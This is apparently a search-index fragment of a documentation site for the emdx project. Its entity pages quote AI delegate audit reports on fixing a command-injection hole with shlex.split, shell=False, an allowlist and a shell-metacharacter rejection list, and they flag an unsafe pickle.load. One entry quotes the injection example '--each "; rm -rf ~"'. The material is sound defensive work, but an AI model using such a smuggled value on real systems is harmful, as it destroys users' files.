<p>#6263 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [28/37]   Section: 1. Command Injection Fix (emdx/commands/delegate.py)</p> <p>...erous shell metacharacters before parsing: <code>;</code>, <code>|</code>, <code>&amp;</code>, backticks, <code>$()</code></p> </li> <li>Uses <code>shlex.split()</code> to properly parse the command</li> <li>Verifies the base command is in the allowlist</li> <li> <p>Changed subprocess call from <code>shell=True</code> to <code>shell=False</code></p> </li> <li> <p>#6260 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [26/37]   Section: Fix Applied</p> <p>...ts shell operators (<code>|</code>, <code>;</code>, <code>&amp;</code>, <code>$(</code>, <code>`</code>, <code>&gt;</code>, <code>&lt;</code>, <code>||</code>, <code>&amp;&amp;</code>)</p> </li> <li>Uses <code>shlex.split()</code> to parse commands safely</li> <li>Validates the base command is in the allowlist</li> <li> <p>Provides clear error messages explaining the security restriction</p> </li> <li> <p>#6258 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [24/37]   Section: Summary</p> <ol> <li>Safe subprocess execution: Uses <code>shlex.split()</code> + <code>shell=False</code>:</li> </ol> </li> <li> <p>#6257 Delegate: Document #6230 (Security Fix Implementation)   Section: Solution</p> <ol> <li>Changed to <code>shell=False</code> with <code>shlex.split()</code>:</li> </ol> </li> <li>Proper argument parsing prevents injection</li> <li> <p>Commands are validated before execution</p> </li> <li> <p>#6255 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [20/37]   Section: Code Changes (<code>emdx/commands/delegate.py</code>)</p> <ol> <li>Added <code>_validate_discovery_command()</code> function:</li> </ol> </li> <li>Uses <code>shlex.split()</code> to safely parse commands</li> <li>Validates base command against allowlist</li> <li> <p>Restricts git to safe subcommands only</p> </li> <li> <p>#6254 Delegate: Fix command injection in --each discovery   Section: The Fix</p> <ol> <li>Parse with shlex: Commands are parsed with <code>shlex.split()</code> instead of passing to shell</li> </ol> </li> <li>No shell execution: Uses <code>subprocess.run(args)</code> without <code>shell=True</code></li> <li> <p>Command allowlist: Only safe discovery commands allow...</p> </li> <li> <p>#6253 Delegate: Fix command injection vulnerability in delegate --each   Section: Fix Applied</p> <p>Replaced <code>shell=True</code> with <code>shlex.split()</code> + <code>shell=False</code> to prevent command injection:</p> </li> <li> <p>#6251 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [16/37]   Section: Summary</p> <ol> <li>Secure execution: Uses <code>shlex.split()</code> with <code>shell=False</code>: ```python</li> </ol> </li> </ul>"},{"location":"entities/shlexsplit/#2-input-validation-_validate_discovery_command","title":"2. Input Validation (<code>_validate_discovery_command</code>)","text":""},{"location":"entities/shlexsplit/#after-secure","title":"AFTER (secure)","text":"<p>args = _validate_discovery_command(command) result = subprocess.run(     args,     shell=False,  # SECURITY: Never us...</p> <ul> <li>#6250 Delegate: Security Fix - Command Injection in --each   Section: Fix Applied <ol> <li>Use <code>shlex.split()</code> to safely parse commands into argument lists</li> </ol> </li> <li>Use <code>shell=False</code> to prevent shell interpretation of metacharacters</li> <li> <p>Added error handling for malformed...</p> </li> <li> <p>#6245 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [2/37]   Section: Fix Implementation</p> </li> <li>Uses <code>shlex.split()</code> for proper argument parsing</li> <li>Uses <code>shell=False</code> to prevent shell interpretation</li> <li> <p>Glob patterns (<code>*</code>, <code>?</code>) are allowed since they're safe with <code>shell=False</code></p> </li> <li> <p>#6243 Delegate: Fix command injection in --each flag   Section: The Fix</p> <p>...scovery_command()` function** - Validates the command before execution:</p> </li> <li>Uses <code>shlex.split()</code> to safely parse the command</li> <li>Extracts the base command name (handles full paths like <code>/usr/bin/fd</code>)</li> <li> <p>Rejects commands not in the allowlist</p> </li> <li> <p>#6242 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [8/37]   Section: Fix Applied</p> <p>...iscovery commands (fd, find, git, rg, ls, grep, etc.)</p> </li> <li>Safe Execution - Use <code>shlex.split()</code> + <code>shell=False</code> to prevent shell injection</li> <li> <p>Metacharacter Rejection - Block shell operators: <code>$()</code>, backticks, pipes, redirects, chaining</p> </li> <li> <p>#6240 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [4/37]   Section: Fix Applied</p> </li> <li> <p>#6238 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [6/37]   Section: The Fix</p> </li> <li> <p>#6237 Delegate synthesis [synthesis]   Section: Critical Findings (Immediate Action Required)</p> <p>...enables arbitrary command execution</p> </li> <li> <p>Fix: Validate/restrict commands or use <code>shlex.split()</code> with <code>shell=False</code></p> </li> <li> <p>#6230 Delegate: Audit SECURITY DEBT in the emdx project: Check for SQL injec [5/14]   Section: Findings</p> <p>Recommendation: Either:</p> </li> <li>Restrict to known-safe commands (fd, find, git ls-files)</li> <li>Parse and validate the command structure before execution</li> <li> <p>Use <code>shlex.split()</code> with <code>shell=False</code></p> </li> <li> <p>#6221 Delegate: Audit SECURITY DEBT in the emdx project: Check for SQL injec [5/14]   Section: 1. COMMAND INJECTION - HIGH SEVERITY</p> <p>Recommendation: Validate and sanitize the <code>--each</code> input, or use <code>shlex.split()</code> with <code>shell=False</code>. Consider restricting to a whitelist of safe discovery commands (fd, find, ls, git ls-files).</p> </li> </ul>"},{"location":"entities/shlexsplit/#3-safe-execution","title":"3. Safe Execution","text":""},{"location":"entities/shlexsplit/#2-no-shell-execution","title":"2. No Shell Execution","text":"<p>Uses <code>shlex.split()</code> + <code>shell=False</code> instead of <code>shell=True</code></p>"},{"location":"entities/shlexsplit/#2-shell-disabled","title":"2. Shell Disabled","text":"<p>Commands are parsed with <code>shlex.split()</code> and executed with <code>shell=False</code>:</p>"},{"location":"entities/shlexsplit/#related-entities","title":"Related Entities","text":"<ul> <li><code>security fix: command injection in delegate --each</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (12 shared docs, PMI=4.9)</li> <li><code>emdx delegate --each</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (10 shared docs, PMI=4.9)</li> <li><code>--each \"; rm -rf ~\"</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (10 shared docs, PMI=4.9)</li> <li><code>critical command injection vulnerability</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (8 shared docs, PMI=4.9)</li> <li><code>command allowlist</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (7 shared docs, PMI=4.9)</li> <li><code>1. command allowlist</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=4.9)</li> <li><code>/usr/bin/fd</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=4.9)</li> <li><code>the vulnerability</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=4.9)</li> <li><code>testvalidatediscoverycommand</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=4.9)</li> <li><code>overall security posture</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=4.9)</li> </ul>"},{"location":"entities/show/","title":"show","text":"<p>Type: tech_term | Mentioned in: 10 documents | First seen: 2026-02-13</p>"},{"location":"entities/show/#documents-10","title":"Documents (10)","text":"<ul> <li> <p>#6837 Delegate: list [1/2]   Section: Fix: Delegate subcommand routing (<code>list</code>, <code>running</code>, <code>stats</code>, etc.)</p> <p>Problem: <code>emdx delegate list</code> (and other subcommands like <code>running</code>, <code>stats</code>, <code>show</code>, etc.) were being treated as task prompts instead of routing to their subcommands. This is because Typer's <code>invoke_without_command=True</code> + variadic <code>[TASKS]...</code> pos...</p> </li> <li> <p>#6836 Delegate: list   Section: Summary</p> <p>The <code>emdx delegate</code> command now supports subcommands (<code>list</code>, <code>running</code>, <code>stats</code>, <code>show</code>, <code>logs</code>, <code>tail</code>, <code>kill</code>, <code>killall</code>, <code>health</code>, <code>monitor</code>) that were previously only accessible via <code>emdx exec</code> (now folded into delegate).</p> </li> <li> <p>#6833 Delegate: list   Section: Summary</p> <p>Two changes fix the issue where <code>emdx delegate list</code> (and other subcommands like <code>running</code>, <code>stats</code>, <code>show</code>, etc.) were being swallowed as task arguments instead of being routed to their subcommand handlers:</p> </li> <li> <p>#6827 Delegate: --help [2/2]   Section: Summary</p> <p>...ic positional <code>[TASKS]...</code> argument would swallow subcommand names (e.g., <code>list</code>, <code>show</code>, <code>kill</code>) as task arguments. The routing detects when the first argument matches a registered subcommand and re-invokes it through Click's machinery.</p> </li> <li> <p>#6825 Delegate: --help [2/2]   Section: Subcommands (Execution Management)</p> <p>...tion | |---------|-------------| | <code>list</code> | List recent executions | | <code>running</code> | Show currently running executions | | <code>stats</code> | Show execution statistics | | <code>show</code> | Show execution details with integrated log viewer | | <code>logs</code> | Show only the logs f...</p> </li> <li> <p>#6549 Delegate: Review PR #654 using 'gh pr view 654' and 'gh pr diff 654'.  [2/6]   Section: Changes Reviewed</p> <p>...<code>parameter to</code>_run_single()<code>| |</code>recipe.py<code>| Added structured recipe support,</code>show<code>and</code>install<code>commands | |</code>recipe_executor.py<code>| New step-by-step execution engine with cleanup safety | |</code>recipe_parser.py` | New markdown parser for recipe form...</p> </li> <li> <p>#6503 None Type Analysis [2/7]   Section: File-by-File Analysis</p> <p>...- <code>exec_id: int | None = typer.Argument(None)</code> in <code>kill</code> command - Legitimate: shows running executions if no ID</p> </li> <li> <p><code>follow: bool = typer.Option(None, ...)</code> in <code>show</code> command - Legitimate: None means \"auto-decide based on execution state\"</p> </li> <li> <p>#6308 Delegate: Analyze API SURFACE &amp; CONCISENESS across emdx/ (exclude ui/  [10/15]   Section: 1. Command Redundancy - HIGH IMPACT</p> <p>Status/Prime overlap:</p> </li> <li><code>emdx status</code> and <code>emdx prime</code> have significant overlap - both show tasks, cascade queue, and execution state</li> <li> <p>Suggestion: Merge into single command with <code>--json</code>/<code>--verbose</code> flags for different use cases</p> </li> <li> <p>#6236 Delegate: Audit TESTING DEBT in the emdx project: Find untested public [10/14]   Section: 1. MODULES WITH 0% TEST COVERAGE (CRITICAL)</p> <p>...mands/executions.py<code>| \ud83d\udd34 CRITICAL | 10 public functions | Test</code>list_executions<code>,</code>show<code>,</code>logs<code>,</code>tail<code>,</code>kill<code>| |</code>commands/gist.py<code>| \ud83d\udd34 CRITICAL | 6 public functions | Test</code>create<code>,</code>update<code>,</code>copy_to_clipboard<code>, auth flow | |</code>commands/maintain.py...</p> </li> <li> <p>#6163 Delegate: Analyze the emdx task CLI commands. Read emdx/commands/tasks [2/15]   Section: Subcommand Analysis</p> </li> <li><code>task_id</code> (required): Task ID</li> </ul>"},{"location":"entities/show/#3-show-show-task-details","title":"3. <code>show</code> \u2014 Show task details","text":"<p>Arguments:</p>"},{"location":"entities/show/#related-entities","title":"Related Entities","text":"<ul> <li><code>kill</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=6.4)</li> <li><code>logs</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.4)</li> <li><code>show -f</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>monitor</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>killall</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>emdx gist create</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>emdx delegate stats</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>emdx/utils/lazy_group.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>--auto-tag</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>health</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> </ul>"},{"location":"entities/similaritypy/","title":"similarity.py","text":"<p>Type: tech_term | Mentioned in: 11 documents | First seen: 2026-02-13</p>"},{"location":"entities/similaritypy/#documents-11","title":"Documents (11)","text":"<ul> <li>#6873 Delegate: Document #6864 (Delegate synthesis [synthesis]):</li> </ul>"},{"location":"entities/similaritypy/#synthes-14","title":"Synthes [1/4]","text":"<p>Section: Functions with ZERO Callers Outside Their Own File</p> <p>...or.py<code>|</code>get_maintenance_recommendations<code>| **NO** | no | *nowhere* | |</code>services/similarity.py<code>|</code>find_similar_by_text<code>| **NO** | no | *nowhere* | |</code>services/similarity.py<code>|</code>invalidate_cache<code>| **NO** | no | *nowhere* | |</code>services/similarity.py<code>|</code>get_i...</p> <ul> <li>#6434 Any/None typing audit [4/5]   Section: auto_tagger.py </li> <li><code>group_service.py</code> \u2705</li> <li><code>tag_service.py</code> \u2705</li> <li><code>document_service.py</code> \u2705</li> <li><code>execution_service.py</code> \u2705</li> <li><code>log_stream.py</code> \u2705</li> <li><code>similarity.py</code> \u2705</li> <li><code>cli_executor/__init__.py</code> \u2705</li> <li> <p><code>cli_executor/factory.py</code> \u2705</p> </li> <li> <p>#6326 Delegate: Analyze emdx/services/ for architecture improvements. Focus  [2/10]   Section: Overlapping/Unclear Boundaries \u26a0\ufe0f</p> <p>...| | <code>embedding_service.py:1-371</code> | 371 | Vector embeddings + semantic search | | <code>similarity.py:1-584</code> | 584 | TF-IDF similarity |</p> </li> <li> <p>#6308 Delegate: Analyze API SURFACE &amp; CONCISENESS across emdx/ (exclude ui/  [10/15]   Section: 6. Service Interface Analysis</p> <p>Services with cleanup potential:</p> </li> <li><code>cascade_service.py</code> - unused, logic moved to commands</li> <li><code>health_monitor.py</code> - overlaps with <code>execution_monitor.py</code></li> <li> <p><code>duplicate_detector.py</code> - replaced by <code>similarity.py</code></p> </li> <li> <p>#6234 Delegate: Tech Debt Category Audit 2026-02-14 [14/14]   Section: CATEGORY 4: Import &amp; Dependency Patterns</p> </li> <li>18 files with ImportError fallbacks - creates runtime None-checks</li> <li>Affects: <code>similarity.py</code>, <code>embedding_service.py</code>, <code>ask_service.py</code>, various UI files</li> <li> <p>Pattern: <code>try: import X except ImportError: X = None</code></p> </li> <li> <p>#6229 Delegate: Audit DEPENDENCY DEBT in the emdx project: Check pyproject.t [1/14]   Section: Well-Designed Patterns Found \u2713</p> <p>...zy imports and helpful error messages</p> </li> <li>Graceful degradation - Services like <code>similarity.py</code>, <code>embedding_service.py</code>, <code>duplicate_detector.py</code> all use <code>try/except ImportError</code> with <code>HAS_*</code> flags</li> <li> <p>Grouped extras - <code>[ai]</code>, <code>[similarity]</code>, <code>[google]</code>, `[a...</p> </li> <li> <p>#6162 Delegate: Audit test coverage. Check: (1) is there a test file for emd [8/17]   Section: (5) Which command modules have NO test file at all?</p> <p>...ps.py<code>) | |</code>maintain.py<code>| \u274c NO | |</code>prime.py<code>| \u274c NO | |</code>recipe.py<code>| \u274c NO | |</code>similarity.py<code>| \u26a0\ufe0f PARTIAL (tests service, some CLI in</code>test_similarity.py<code>) | |</code>status.py<code>| \u274c NO | |</code>tags.py<code>| \u2705 YES (</code>test_commands_tags.py<code>) | |</code>tasks.py<code>| \u274c NO | |</code>tra...</p> </li> <li> <p>#6511 None Type Analysis [synthesis]   Section: File-by-File Summary</p> <p>...- unified_search.py: All 7 necessary</p> </li> <li>auto_tagger.py: All 8 necessary</li> <li>similarity.py: All 2 necessary</li> <li>ask_service.py: All 2 necessary</li> <li>synthesis_service.py: All 2 necessary</li> <li>document_merger.py: All 5 necessary</li> <li> <p>**embedding_service....</p> </li> <li> <p>#6497 None Type Analysis [6/7]   Section: UNNECESSARY <code>| None</code> Annotations</p> </li> </ul> <pre><code>def __init__(self, db_path: Path | None = None):\n</code></pre> <p>Assessment: NECESSARY \u2014 parameter has default <code>None</code>, used for optional override.</p> <ul> <li>#6221 Delegate: Audit SECURITY DEBT in the emdx project: Check for SQL injec [5/14]   Section: 2. UNSAFE PICKLE DESERIALIZATION - MEDIUM SEVERITY <p>Location: <code>emdx/services/similarity.py:103-104</code></p> </li> </ul> <pre><code>with open(self._cache_path, 'rb') as f:\n    cache_data = pickle.load(f)\n</code></pre> <ul> <li>#6171 Delegate: Systematic cross-cutting grep for ALL references to removed  [10/17]   Section: 6. Similarity Service \u2014 exclude_workflow (4 hits) <p>File: <code>emdx/services/similarity.py</code></p> </li> </ul>"},{"location":"entities/similaritypy/#files-with-no-any-usage","title":"Files with NO <code>Any</code> usage","text":""},{"location":"entities/similaritypy/#import-complexity","title":"Import Complexity","text":""},{"location":"entities/similaritypy/#3-similaritypy75-similarityservice__init__","title":"3. <code>similarity.py:75</code> \u2014 <code>SimilarityService.__init__</code>","text":""},{"location":"entities/similaritypy/#related-entities","title":"Related Entities","text":"<ul> <li><code>execution_service.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=6.3)</li> <li><code>json</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>find_all_duplicate_pairs</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>cli_executor/cursor.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>embedding_service.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (7 shared docs, PMI=5.9)</li> <li><code>cli_executor/factory.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.9)</li> <li><code>cli_executor/claude.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.9)</li> <li><code>duplicate_detector.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (7 shared docs, PMI=5.8)</li> <li><code>file_watcher.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.7)</li> <li><code>services/claude_executor.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.7)</li> </ul>"},{"location":"entities/similarityservice/","title":"similarityservice","text":"<p>Type: tech_term | Mentioned in: 9 documents | First seen: 2026-02-13</p>"},{"location":"entities/similarityservice/#documents-9","title":"Documents (9)","text":"<ul> <li> <p>#6584 Delegate: Add missing all exports to emdx/services/cli_executor/__ [1/2]   Section: <code>emdx/services/__init__.py</code> \u2014 9 Symbols Added</p> <p>Previously exported (6): <code>AutoTagger</code>, <code>DuplicateDetector</code>, <code>IndexStats</code>, <code>SimilarDocument</code>, <code>SimilarityService</code>, <code>execute_claude_detached</code></p> </li> <li> <p>#6583 Delegate synthesis [synthesis]   Section: Test Suite</p> <p>...most critical finding</p> </li> <li>5 core domain classes (<code>UnifiedExecutor</code>, <code>CliExecutor</code>, <code>SimilarityService</code>, <code>DistillService</code>, <code>psutil.Process</code>) are mocked without specs in high-traffic tests</li> <li> <p>A rename or signature change to any mocked method would produce **silently pas...</p> </li> <li> <p>#6580 Delegate: Check tests/ for mocks that use MagicMock() where a spec= wo [3/3]   Section: P0 \u2014 HIGH RISK: Mocks of domain classes with evolving APIs</p> </li> <li>File: <code>test_document_merger.py</code> (11 instances)</li> <li> <p>Risk: Tests call <code>find_all_duplicate_pairs()</code>, <code>build_index()</code> \u2014 both real methods. An unspecced mock won...</p> </li> <li> <p>#6327 Delegate: analysis,architecture [7/10]   Section: Areas for Improvement</p> </li> <li> <p><code>EmbeddingService</code>, <code>UnifiedSearchService</code>, <code>SimilarityService</code>, <code>AskService</code></p> </li> <li> <p>#6233 Delegate: Dead Code Audit - emdx Project [2/14]   Section: 1. UNUSED IMPORTS (High Priority)</p> <p>...<code>DuplicateDetector</code>, <code>execute_claude_detached</code>, <code>IndexStats</code>, <code>SimilarDocument</code>, <code>SimilarityService</code></p> </li> <li><code>emdx/services/ask_service.py:8</code> - unused import: <code>annotations</code></li> <li> <p><code>emdx/services/claude_executor.py:24-26</code> - unused imports: <code>CliTool</code>, <code>get_cli_config</code>, `DEFAULT...</p> </li> <li> <p>#6155 Delegate: Audit the emdx CLI for dead/unused features that should be r [1/3]   Section: 5. The 'similar' Command \u2014 Works Correctly</p> <p>...and imports correctly without sklearn installed. When called without sklearn, the <code>SimilarityService</code> raises a clear error:</p> </li> </ul> <pre><code>ImportError: scikit-learn is required for similarity features. \nInstall it with: pip install 'emdx[similarity]'\n</code></pre> <ul> <li> <p>#6148 Delegate: Review PR #449 (Dream Journal). Run: gh pr diff 449. Check c [3/7]   Section: Gameplan Alignment (vs #6101)</p> <p>...| | Duplicate detection pass | \u2705 | Uses <code>find_all_duplicate_pairs()</code> from existing SimilarityService | | Pattern detection | \u2705 | Cross-project tag analysis, done-gameplan archival suggestions | | Contradiction detection | \u23ed\ufe0f SKIPPED | Correctly skipped per gameplan...</p> </li> <li> <p>#6140 Delegate: Read gameplan by running: emdx view 6101. Implement the Drea [5/7]   Section: Dream Journal Implementation Complete</p> </li> <li>Duplicate detection: Uses existing <code>SimilarityService</code> (TF-IDF) to find similar documents</li> <li>Pattern detection: SQL queries to find cross-project tag usage and completed gameplans</li> <li>Hygiene checks: Finds untagged...</li> </ul>"},{"location":"entities/similarityservice/#3-mock_service-magicmock-standing-in-for-similarityservice","title":"3. <code>mock_service = MagicMock()</code> standing in for <code>SimilarityService</code>","text":""},{"location":"entities/similarityservice/#4-service-class-inconsistency","title":"4. Service Class Inconsistency","text":"<p>Only 4 classes follow <code>*Service</code> pattern:</p>"},{"location":"entities/similarityservice/#features-implemented","title":"Features Implemented","text":""},{"location":"entities/similarityservice/#related-entities","title":"Related Entities","text":"<ul> <li><code>spec=</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.6)</li> <li><code>psutil.process</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.6)</li> <li><code>zero mock specs = zero regression safety net</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>unspecced mocks</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>typed parameters</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>type safety audit synthesis:</code>emdx/services/<code>,</code>emdx/ui/<code>, and</code>tests/` \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>type safety audit synthesis</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>the production code has moderate</code>any<code>usage that's mostly fixable, while the test suite has zero</code>spec=<code>coverage across 220+ mocks \u2014 a significant regression risk.</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>test mock specs:</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>test mock gap is the highest-risk finding</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> </ul>"},{"location":"entities/smart-priming/","title":"smart priming","text":"<p>Type: concept | Mentioned in: 18 documents | First seen: 2026-02-13</p>"},{"location":"entities/smart-priming/#documents-18","title":"Documents (18)","text":"<ul> <li>#6474 EMDX Feature Implementation Synthesis   Section: Related Feature Roadmap <p>...ocuments</p> </li> <li>\ud83d\udd04 Auto-Linking on Save - Create knowledge graph connections</li> <li>\ud83d\udd04 Smart Priming - Context-aware session initialization</li> <li>\ud83d\udd04 Semantic Search Upgrade - Chunk-level retrieval</li> <li> <p>\ud83d\udd04 Dream Journal - Overnight KB consolidation</p> </li> <li> <p>#6111 EMDX Feature Sprint - 7 Parallel Builds   Section: The 7 Features</p> <p>...ing on Save \u2014 self-organizing KB | #6098 | feat/auto-linking | pending | | 3 | Smart Priming \u2014 context-aware <code>emdx prime --smart</code> | #6099 | feat/smart-priming | pending | | 4 | Semantic Find Upgrade** \u2014 hybrid + chunk-level search | #6100 | feat/semantic...</p> </li> <li> <p>#6094 EMDX Feature Deep Dive - Claude-First Design   Section: PRIORITY ORDER (for real this time)</p> <p>...st effort</p> </li> <li>Auto-Linking on Save (#2) \u2014 self-organizing KB, low effort  </li> <li>Smart Priming (#1) \u2014 better session starts, medium effort</li> <li>Semantic find upgrade (#5) \u2014 chunk-level search, medium effort</li> <li> <p>Dream Journal (#3) \u2014 overnight consolidati...</p> </li> <li> <p>#6524 Delegate: FEAT-5 Smart Priming Implementation   Section: Summary</p> <p>Implemented Phase 1 (Git Context) and Phase 2 (Key Docs) of the FEAT-5 Smart Priming gameplan.</p> </li> <li> <p>#6522 Gameplan: FEAT-5 Smart Priming Gaps</p> </li> </ul>"},{"location":"entities/smart-priming/#gameplan-feat-5-smart-priming-remaining-gaps","title":"Gameplan: FEAT-5 Smart Priming \u2014 Remaining Gaps","text":""},{"location":"entities/smart-priming/#context","title":"Context","text":"<p>PR #446 was closed unmerged. Most features have been implemented via other paths.</p> <ul> <li>#6521 Delegate synthesis [synthesis]   Section: Executive Summary <p>Two PRs were closed without merging on 2026-02-15:</p> </li> <li>PR #446 (FEAT-5): Smart Priming \u2014 Most features already implemented via alternative approaches; one significant gap remains</li> <li> <p>PR #453 (FEAT-7): Ask-KB Improvements \u2014 **All features remain u...</p> </li> <li> <p>#6520 Delegate: Analyze FEAT-5: Re-implement smart priming (PR #446). The or [1/2]</p> </li> </ul>"},{"location":"entities/smart-priming/#gap-analysis-smart-priming-pr-446-feat-5","title":"Gap Analysis: Smart Priming (PR #446 / FEAT-5)","text":""},{"location":"entities/smart-priming/#executive-summary","title":"Executive Summary","text":"<p>PR #446 implemented a <code>--smart</code> flag for <code>emdx prime</code> with context-aware features. The PR was closed without merging on 2026-02-15.</p> <ul> <li> <p>#6483 Delegate: Kink 5: Unify delegate branch naming in emdx/commands/delega [2/3]   Section: Examples</p> <p>...| <code>Gameplan #1: Contextual Save</code> | <code>delegate/contextual-save-8183a</code> | | <code>Feature: Smart Priming (context-aware)</code> | <code>delegate/smart-priming-context-aware-9b5ff</code> | | <code>Implement caching for API calls</code> | <code>delegate/implement-caching-for-api-calls-97c2d</code> |</p> </li> <li> <p>#6212 Delegate: Sprint PR Fixes [8/8]   Section: PR Status</p> <p>...454 | 